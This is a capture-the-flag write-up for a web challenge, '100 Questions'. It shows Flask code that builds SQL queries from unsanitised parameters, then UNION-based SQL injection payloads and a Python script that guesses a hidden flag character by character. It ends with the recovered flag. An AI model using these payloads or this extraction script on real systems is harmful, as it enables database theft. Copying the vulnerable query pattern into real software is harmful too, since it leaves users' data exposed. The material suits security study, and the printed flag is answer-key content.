## 100 Questions

[dist.zip](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Medium/100-questions/dist.zip)

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Medium/100-questions/chall.png)

> This challenge shows a question with a text box to fill in the answer to the question. It reflects `Correct!` when answered correctly

```python
@app.route("/", methods=["GET"])
def index():
    qn_id, ans= request.args.get("qn_id", default="1"), request.args.get("ans", default="")

    # id check, i don't want anyone to pollute the inputs >:(
    if not (qn_id and qn_id.isdigit() and int(qn_id) >= 1 and int(qn_id) <= 100):
        # invalid!!!!!
        qn_id = 1

    # get question
    db = sqlite3.connect("database.db")
    cursor = db.execute(f"SELECT Question FROM QNA WHERE ID = {qn_id}")
    qn = cursor.fetchone()[0]

    # check answer
    cursor = db.execute(f"SELECT * FROM QNA WHERE ID = {qn_id} AND Answer = '{ans}'")
    result = cursor.fetchall()
    correct = True if result != [] else False

    return render_template("index.html", qn_id=qn_id, qn=qn, ans=ans, correct=correct)
```

> From the code, it is noted that parameterized queries were not used. As such, the parameters `qn_id` and `ans` are vulnerable to SQL injections. We can confirm this by testing it on the site

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Medium/100-questions/sqlinjection.png)

> In the files provided in the challenge, we also have access to a database which tells us the name of the table as well as the columns. Also, `ID 42` is where the `FLAG` is.

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Medium/100-questions/database.png)

> Since we already have the name of the table and columns, we do not need to do blind SQL injection to get number of columns using commands such as:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

> We can go straight to craft our payload as follows:

```
' UNION SELECT ID,Question,Answer from QNA where ID='42' and Question='Flag' and Answer like 'grey%'--
```

> Here, we use the `like` operator to guess the characters, since we are only given either `Correct!` or `No input / wrong!!!! Try harder` for our SQL statement. We use "grey" as a starting point since that is the flag format we are given, so we are sure that the flag starts with `grey`

> Note that if the next character we test is wrong, we will be given a failure message and that is an indicator for us to try a different character until we eventually get the flag

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Medium/100-questions/mismatch.png)

> We can craft our exploit code, using BeautifulSoup to get the indicator message for us to do the checking

```python
import requests
import string
from bs4 import BeautifulSoup

domain = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_}{ '

check = "Correct!"
url = 'http://34.126.139.50:10512/?qn_id=1&ans='
inject_1 = "' UNION SELECT ID,Question,Answer from QNA where ID='42' and Question='Flag' and Answer like '"
inject_2 = "grey"
inject_3 = "%'--"

while True:
    for char in domain:
        inject_2+=char

        response = requests.get(url+inject_1+inject_2+inject_3)

        soup = BeautifulSoup(response.text, 'html.parser')
        last_paragraph = soup.find_all('p')[-1]
        value = last_paragraph.text.strip()
        if value==check:
            print(inject_2)
            break
        else:
            inject_2 = inject_2[:-1]
```

> We get grey{1_c4n7_533}. Note that `like` is case insensitive, so try capitalizing c and/or n to eventually get the flag

`grey{1_C4n7_533}`
